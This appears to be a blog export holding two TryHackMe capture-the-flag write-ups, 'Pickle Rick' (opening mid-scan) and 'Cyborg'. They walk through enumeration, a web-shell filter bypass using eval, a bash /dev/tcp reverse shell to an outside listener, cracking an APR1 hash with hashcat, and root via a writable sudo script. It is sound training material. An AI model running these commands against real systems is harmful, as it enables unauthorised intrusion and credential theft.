((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Rick is sup4r coolNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=12/28%OT=22%CT=1%CU=42167%PV=Y%DS=4%DC=T%G=Y%TM=61CBC7OS:CD%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)SEOS:Q(SP=102%GCD=1%ISR=109%TI=Z%CI=I%TS=8)OPS(O1=M506ST11NW7%O2=M506ST11NW7%OS:O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2OS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSOS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 33.14 secondsWith a pair of ports to look at, I kicked off a longer more complete scan (nmap -T4 -A -p- picklerick) and opened my browser.Not much to look at. There aren’t any links or forms. Let’s take a look at the page source.... &lt;div class=\"container\"&gt; &lt;div class=\"jumbotron\"&gt;&lt;/div&gt; &lt;h1&gt;Help Morty!&lt;/h1&gt;&lt;/br&gt; &lt;p&gt;Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!&lt;/p&gt;&lt;/br&gt; &lt;p&gt;I need you to &lt;b&gt;*BURRRP*&lt;/b&gt;....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the &lt;b&gt;*BURRRRRRRRP*&lt;/b&gt;, password was! Help Morty, Help!&lt;/p&gt;&lt;/br&gt; &lt;/div&gt; &lt;!-- Note to self, remember username! Username: R1ckRul3s --&gt;&lt;/body&gt;&lt;/html&gt;Ah, a user name! Let’s quickly try it on the SSH port.$ ssh R1ckRul3s@picklerickR1ckRul3s@picklerick: Permission denied (publickey).Interesting…we can’t SSH into the machine without a key. Maybe we’ll find one later. Meanwhile, my deep scan did not produce any other open ports.Next, let’s run a feroxbuster scan for other pages and directories. Be sure to give your discovery tool some file extensions to use in its search!Only an assets directory is available and it doesn’t have anything that helps us. Just a few images, bootstrap, and jquery.Index of /assets[ICO] Name Last modified Size Description[DIR] Parent Directory -[TXT] bootstrap.min.css 2019-02-10 16:37 119K\t [ ] bootstrap.min.js 2019-02-10 16:37 37K\t [IMG] fail.gif 2019-02-10 16:37 49K\t [ ] jquery.min.js 2019-02-10 16:37 85K\t [IMG] picklerick.gif 2019-02-10 16:37 222K\t [IMG] portal.jpg 2019-02-10 16:37 50K\t [IMG] rickandmorty.jpeg 2019-02-10 16:37 488K\t Apache/2.4.18 (Ubuntu) Server at picklerick Port 80Let’s run feroxbuster again with a different wordlist. The first run used directory-list-lowercase-2.3-medium.txt. This time we’ll use common.txt.Of course! I totally forgot to check robots.txt.robots.txtREDACTEDWell, that doesn’t give us anything new to look at. Okay, let’s try Nikto.$ nikto -url http://picklerick- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 10.10.132.139+ Target Hostname: picklerick+ Target Port: 80+ Start Time: 2021-12-28 22:17:49 (GMT-5)---------------------------------------------------------------------------+ Server: Apache/2.4.18 (Ubuntu)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use '-C all' to force check all possible dirs)+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS + Cookie PHPSESSID created without the httponly flag+ OSVDB-3233: /icons/README: Apache default file found.+ /login.php: Admin login page/section found.+ 7681 requests: 0 error(s) and 9 item(s) reported on remote host+ End Time: 2021-12-28 22:34:05 (GMT-5) (976 seconds)---------------------------------------------------------------------------+ 1 host(s) testedAnd there’s my mistake. I wasn’t running feroxbuster with any file extensions. Nikto found an admin login page for me.Admin Portal AccessWe probably have a valid username (found in the HTML source), but no password. As I was preparing to mount a brute force attack, I took a mental inventory of obscure information I’d come across so far. What about the odd content I found in robots.txt? Let’s try it: R1ckRul3s:REDACTEDIt worked! There also appears to be a built in web shell. It has some restrictions. We can’t run the cat command.Bypassing Web Shell RestrictionsThat’s easily bypassed though. We can construct a command string by contcatenating strings together like this:var1=\"c\"; var2=\"at\"; eval \"$var1$var2 /etc/passwd\"And it works perfectly.First IngredientLet’s see what’s in the web directory (ls /var/www/html).total 40drwxr-xr-x 3 root root 4096 Feb 10 2019 .drwxr-xr-x 3 root root 4096 Feb 10 2019 ..-rwxr-xr-x 1 ubuntu ubuntu 17 Feb 10 2019 Sup3rS3cretPickl3Ingred.txtdrwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10 2019 assets-rwxr-xr-x 1 ubuntu ubuntu 54 Feb 10 2019 clue.txt-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10 2019 denied.php-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10 2019 index.html-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10 2019 login.php-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10 2019 portal.php-rwxr-xr-x 1 ubuntu ubuntu 17 Feb 10 2019 robots.txtLooks like we found our first ingredient. Let’s cat the file using the obfuscation method used earlier (var1=\"c\"; var2=\"at\"; eval \"$var1$var2 /var/www/html/Sup3rS3cretPickl3Ingred.txt\").REDACTEDMaybe the clue file will help us with the next ingredient (var1=\"c\"; var2=\"at\"; eval \"$var1$var2 /var/www/html/clue.txt\").Look around the file system for the other ingredient.Opening a Reverse ShellWe could continue to use the web shell, but it’ll be easier to move around the system with a fully functional shell. There are many options here. We could: Hijack index.html by renaming it to index.php and overwrite it with a PHP reverse shell. Generate a reverse shell binary with msfvenom, write it to tmp, and execute it. Directly invoke a reverse shell from the web shell.The third option seems the simplest, although I had a lot of issues getting a stable shell. I ultimately used option two and then after completing the objectives I dug into why my shells weren’t working. See the [[#Shell Failure Analysis]] section for more information.Second IngredientUsing the web shell, we can open a bash reverse shell (bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.100/4444 0&gt;&amp;1') as the www-data user.$ nc -nvlp 4444listening on [any] 4444 ...connect to [parrot] from (UNKNOWN) [picklerick] 40300bash: cannot set terminal process group (1336): Inappropriate ioctl for devicebash: no job control in this shellwww-data@picklerick:/var/www/html$ whoamiwhoamiwww-datawww-data@picklerick:/var/www/html$ It’s now much easier to move around the system and we quickly find there’s a home directory for rick with the second ingredient.www-data@picklerick:/var/www/html$ cd /homecd /homewww-data@picklerick:/home$ ls -alls -altotal 16drwxr-xr-x 4 root root 4096 Feb 10 2019 .drwxr-xr-x 23 root root 4096 Dec 31 00:44 ..drwxrwxrwx 2 root root 4096 Feb 10 2019 rickdrwxr-xr-x 4 ubuntu ubuntu 4096 Dec 31 02:51 ubuntuwww-data@picklerick:/home$ cd rickcd rickwww-data@picklerick:/home/rick$ ls -alls -altotal 12drwxrwxrwx 2 root root 4096 Feb 10 2019 .drwxr-xr-x 4 root root 4096 Feb 10 2019 ..-rwxrwxrwx 1 root root 13 Feb 10 2019 second ingredientswww-data@picklerick:/home/rick$ cat second\\ ingredientscat second\\ ingredientsREDACTEDwww-data@picklerick:/home/rick$ Privilege EscalationThird IngredientFinally, we need root access to get the third ingredient. Let’s start by checking sudo privileges.www-data@picklerick:/home/rick$ sudo -lsudo -lMatching Defaults entries for www-data on picklerick.eu-west-1.compute.internal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on picklerick.eu-west-1.compute.internal: (ALL) NOPASSWD: ALLwww-data@picklerick:/home/rick$ www-data@picklerick:/home/rick$ sudo su -sudo su -mesg: ttyname failed: Inappropriate ioctl for devicewhoamirootls -altotal 28drwx------ 4 root root 4096 Feb 10 2019 .drwxr-xr-x 23 root root 4096 Dec 31 00:44 ..-rw-r--r-- 1 root root 29 Feb 10 2019 3rd.txt-rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrc-rw-r--r-- 1 root root 148 Aug 17 2015 .profiledrwxr-xr-x 3 root root 4096 Feb 10 2019 snapdrwx------ 2 root root 4096 Feb 10 2019 .sshcat 3rd.txtREDACTEDThat’s all three ingredients! Keep reading if you’re curious why you have to double your bash command to get a proper reverse shell.Shell Failure AnalysisWhile experimenting with reverse shells through the web shell, I couldn’t get the bash reverse shell to work.bash -i &gt;&amp; /dev/tcp/10.0.0.100/4444 0&gt;&amp;1I’d just get an empty response. An empty response made some sense: PHP wasn’t capturing stderr and shipping it back through the browser, it was just relaying stdout. I wanted to see that error output, so I used my root access to add an authorized key to the ubuntu user and SSH’d into the box. Next I examined the web shell code in the portal.php file. It was just doing a PHP shell_exec and returning the output.I started an interactive PHP session and emulated this functionality.ubuntu@picklerick:~$ php -aInteractive mode enabledphp &gt; echo(shell_exec(\"bash -i &gt;&amp; /dev/tcp/10.0.0.100/4444 0&gt;&amp;1\"));sh: 1: Syntax error: Bad fd numberphp &gt; Bad fd number? At first I was confused, but then as I thought about it I figured it must be referring to the stderr or stdout file descriptors referenced in the command. I needed more information though; the 0 and 1 seemed to be in the correct place.I found this answer on the UNIX &amp; Linux Stack Exchange: &gt;&amp; is the csh syntax (also supported by zsh and recent versions of bash) to redirect both stdout and stderr to a file.I found another unrelated post (I, of course, cannot find as I’m writing this) that provided me with a bit more context: /bin/sh is usually mapped to /bin/dash, and /bin/dash does not support this syntax.Using this command, let’s see what shell gets used by shell_exec.php &gt; echo(shell_exec(\"ps -p $$\")); PID TTY TIME CMD 2121 pts/0 00:00:00 shphp &gt; It’s sh, and it’s mapped to dash too.$ ls -al /bin/shlrwxrwxrwx 1 root root 4 Nov 3 22:06 /bin/sh -&gt; dashThat explains why my shell kept failing; and why to make it work you have to double your bash command.bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.100/4444 0&gt;&amp;1'When I ran just the single quoted part of the above command, it was executing inside a dash shell. dash doesn’t understand the &gt;&amp; syntax to direct the interactive bash shell into. I have to wrap that command inside a bash -c so that it executes inside a bash shell which does understand the &gt;&amp; syntax.I’ve come across this before and never had time to investigate. I hope this extra analysis saves someone else the trouble." }, { "title": "Cyborg - TryHackMe", "url": "/posts/cyborg/", "categories": "tryhackme, writeup", "tags": "easy", "date": "2021-12-25 17:11:04 -0500", "snippet": "Cyborg was an easy TryHackMe box involving misconfiguration and encrypted backup archives. You start by finding an open admin page that has a download link to an encrypted archive. There is a misco...", "content": "Cyborg was an easy TryHackMe box involving misconfiguration and encrypted backup archives. You start by finding an open admin page that has a download link to an encrypted archive. There is a misconfigured squid proxy on the system that allows you to obtain the password, which is then easily cracked. The same password was used to encrypt the archive and the user has left their credentials in a plaintext file within. Those credentials will allow you to log in through SSH. Once on the system, you can escalate your privileges by modifying an MP3 backup script that has been granted sudo privileges. Please note: To comply with TryHackMe’s write-up requirements, I’ve included a link to TryHackMe above and redacted all passwords, cracked hashes, and flags.Initial EnumerationLet’s start with a scan to see what kind of attack surface we’re working with.Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-25 21:17 ESTNmap scan report for cyborg (cyborg)Host is up (0.16s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)| 256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)|_ 256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 48.63 secondsTwo ports open! I like when there are only a couple of ports open. It means fewer things to look at and less chance of a dead end.Let’s hit the web port with our browser and see what comes up.A default page won’t get us anything useful, so the next step is to run a directory buster. I’ve been playing with feroxbuster recently, so we’ll use that to see what comes up.Ooh, an admin panel!There’s almost nothing here, but under the “Archive” menu there’s a download link for an archive tarball (archive.tar).Examining the ArchiveIf the filename hasn’t given it away, the folder structure indicates this is clearly a backup archive.home/field/dev/final_archive/home/field/dev/final_archive/hints.5home/field/dev/final_archive/integrity.5home/field/dev/final_archive/confighome/field/dev/final_archive/READMEhome/field/dev/final_archive/noncehome/field/dev/final_archive/index.5home/field/dev/final_archive/data/home/field/dev/final_archive/data/0/home/field/dev/final_archive/data/0/5home/field/dev/final_archive/data/0/3home/field/dev/final_archive/data/0/4home/field/dev/final_archive/data/0/1The README file helps us identify what software created it.This is a Borg Backup repository.See https://borgbackup.readthedocs.io/home/field/dev/final_archive/READMELet’s go read some documentation! The Quick Start guide has exactly what we’ll need. Step four desribes how to list all archives in a repository, which seems like a reasonable first probe to see what we’re working with. First we’ll need the Borg command utility installed. I didn’t want to install another package on my machine I’ll never touch again, so I grabbed the latest binaries from their releases page and tried the list command.$ borg-dir/borg.exe list home/field/dev/final_archiveEnter passphrase for key /home/iptunneler/thm/cyborg/home/field/dev/final_archive: List the archive contentsBlocked! We need a password to access the archive. Let’s go back and dig around the admin panel for more clues.Enumeration ContinuedThere’s an “Admin Shoutbox” page that looks like a chat log.[Today at 5.45am from Alex]Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.I decided to give up like i always do ahahaha sorry about that.I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.Might pass it over to the IT guys but in the meantime all the config files are laying about.And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.other than that im pretty sure my backup \"music_archive\" is safe just to confirm.Chat logs provide a clueThis message explains some of the feroxbuster results we skipped over earlier. The /etc/squid path gives us a directory listing with the squid proxy config and a passwd file.music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn./etc/squid/passwdauth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwdauth_param basic children 5auth_param basic realm Squid Basic Authenticationauth_param basic credentialsttl 2 hoursacl auth_users proxy_auth REQUIREDhttp_access allow auth_users/etc/squid/squid.confPassword CrackingUsing hash-identifier, we can figure out what kind of hash we’re dealing with.$ hash-identifier ######################################################################### # __ __ __ ______ _____ # # /\\ \\/\\ \\ /\\ \\ /\\__ _\\ /\\ _ `\\ # # \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\/_/\\ \\/ \\ \\ \\/\\ \\ # # \\ \\ _ \\ /'__`\\ / ,__\\ \\ \\ _ `\\ \\ \\ \\ \\ \\ \\ \\ \\ # # \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ # # \\ \\_\\ \\_\\ \\___ \\_\\/\\____/ \\ \\_\\ \\_\\ /\\_____\\ \\ \\____/ # # \\/_/\\/_/\\/__/\\/_/\\/___/ \\/_/\\/_/ \\/_____/ \\/___/ v1.2 # # By Zion3R # # www.Blackploit.com # # Root@Blackploit.com # #########################################################################-------------------------------------------------- HASH: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.Possible Hashs:[+] MD5(APR)-------------------------------------------------- HASH: MD5(APR); that’s hash-mode 1600 in hashcat. Let’s see if we can crack it.$ hashcat -m1600 -a0 --show '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:REDACTEDUsing hashcat to crack the squid hashUnlocking the ArchiveGreat! Hopefully the admin likes to re-use passwords. Let’s see if it we can use it to unlock the backup archive.$ borg-dir/borg.exe list home/field/dev/final_archiveEnter passphrase for key /home/iptunneler/thm/cyborg/home/field/dev/final_archive: music_archive Tue, 2020-12-29 09:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]Try listing the archive again with the cracked passwordAnother win! Okay, let’s unpack it and see what’s inside.$ borg-dir/borg.exe extract home/field/dev/final_archive::music_archiveEnter passphrase for key /home/iptunneler/thm/cyborg/home/field/dev/final_archive:$ find home/alex -not -path \"home/alex/.config/*\" -not -path \"home/alex/.dbus/*\"home/alexhome/alex/.bashrchome/alex/.bash_logouthome/alex/.profilehome/alex/Musichome/alex/.bash_historyhome/alex/.dbushome/alex/.confighome/alex/Documentshome/alex/Documents/note.txthome/alex/Publichome/alex/Videoshome/alex/Desktophome/alex/Desktop/secret.txthome/alex/Downloadshome/alex/Templateshome/alex/Pictures$ cat home/alex/Documents/note.txtWow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!alex:REDACTEDExplore the extracted archiveGaining User AccessLooks like some plaintext credentials to me. Let’s try them on the SSH port.$ ssh alex@cyborgThe authenticity of host 'cyborg (10.10.123.70)' can't be established.ECDSA key fingerprint is SHA256:uB5ulnLcQitH1NC30YfXJUbdLjQLRvGhDRUgCSAD7F8.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added 'cyborg,10.10.123.70' (ECDSA) to the list of known hosts.alex@cyborg's password: Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage27 packages can be updated.0 updates are security updates.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.alex@ubuntu:~$ ls -al user.txt-r-xr--r-- 1 alex alex 40 Dec 30 2020 user.txtalex@ubuntu:~$ cat user.txtflag{REDACTED}alex@ubuntu:~$ Try the credentials on the SSH servicePrivilege EscalationInitial user access accomplished. Now on to gaining root. Let’s see what alex can sudo.alex@ubuntu:~$ sudo -lMatching Defaults entries for alex on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser alex may run the following commands on ubuntu: (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.shalex@ubuntu:~$ ls -al /etc/mp3backups/backup.sh-r-xr-xr-- 1 alex alex 1083 Dec 30 2020 /etc/mp3backups/backup.shalex@ubuntu:~$ Check sudo permissions for alexIt doesn’t get easier than a writable custom script. All we need to do is add the write permission to the file and add a line to the script that spawns a new shell.alex@ubuntu:~$ chmod u+w /etc/mp3backups/backup.shalex@ubuntu:~$ vi /etc/mp3backups/backup.shAdd write permissions and edit the backup script#!/bin/bashsudo /bin/bash # Addedexit 0 # Addedsudo find / -name \"*.mp3\" | sudo tee /etc/mp3backups/backed_up_files.txt.../etc/mp3backups/backup.sh - Modified to spawn a root shellalex@ubuntu:~$ sudo /etc/mp3backups/backup.shroot@ubuntu:/root# cd /rootroot@ubuntu:/root# ls -al root.txt-r-xr--r-- 1 root root 43 Dec 30 2020 root.txtroot@ubuntu:/root# cat root.txtflag{REDACTED}root@ubuntu:/root# " } ]
